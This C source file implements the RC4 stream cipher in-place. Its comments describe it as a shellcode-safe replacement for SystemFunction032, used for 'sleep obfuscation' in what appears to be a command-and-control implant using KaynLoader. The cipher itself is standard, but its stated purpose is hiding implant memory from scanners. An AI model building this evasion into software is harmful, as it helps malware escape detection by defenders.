/* RC4 stream cipher - pure C, no CRT, shellcode-safe.
 * Replaces advapi32!SystemFunction032 for sleep obfuscation.
 * Compatible with EXE, DLL, SHELLCODE, and KaynLoader build modes. */
#include <crypt/Rc4Crypt.h>

/* RC4 KSA + PRGA in-place. S-box is 256 bytes on stack; safe in all build modes.
 * always_inline: eliminates relative CALL so the heap trampoline copy is self-contained. */
static inline __attribute__((always_inline)) VOID Rc4CryptBuf( PVOID Data, DWORD DataLen, PVOID Key, DWORD KeyLen )
{
    BYTE   S[ 256 ];
    UINT32 i, j, k;
    BYTE   t;

    /* key scheduling algorithm (KSA) */
    for ( i = 0; i < 256; i++ )
        S[ i ] = (BYTE)i;

    for ( i = 0, j = 0; i < 256; i++ ) {
        j = ( j + S[ i ] + ((PBYTE)Key)[ i % KeyLen ] ) & 0xFF;
        t = S[ i ]; S[ i ] = S[ j ]; S[ j ] = t;
    }

    /* pseudo-random generation algorithm (PRGA) */
    i = 0; j = 0;
    for ( k = 0; k < DataLen; k++ ) {
        i = ( i + 1 ) & 0xFF;
        j = ( j + S[ i ] ) & 0xFF;
        t = S[ i ]; S[ i ] = S[ j ]; S[ j ] = t;
        ((PBYTE)Data)[ k ] ^= S[ ( S[ i ] + S[ j ] ) & 0xFF ];
    }
}

/* USTRING wrapper - drop-in replacement for SystemFunction032.
 * RCX = &Data (USTRING), RDX = &Key (USTRING). Key->Length = any nonzero byte count. */
NTSTATUS WINAPI RC4CryptUString( USTRING* Data, USTRING* Key )
{
    if ( !Data || !Data->Buffer || !Key || !Key->Buffer || !Key->Length )
        return STATUS_INVALID_PARAMETER;

    Rc4CryptBuf( Data->Buffer, Data->Length, Key->Buffer, Key->Length );
    return STATUS_SUCCESS;
}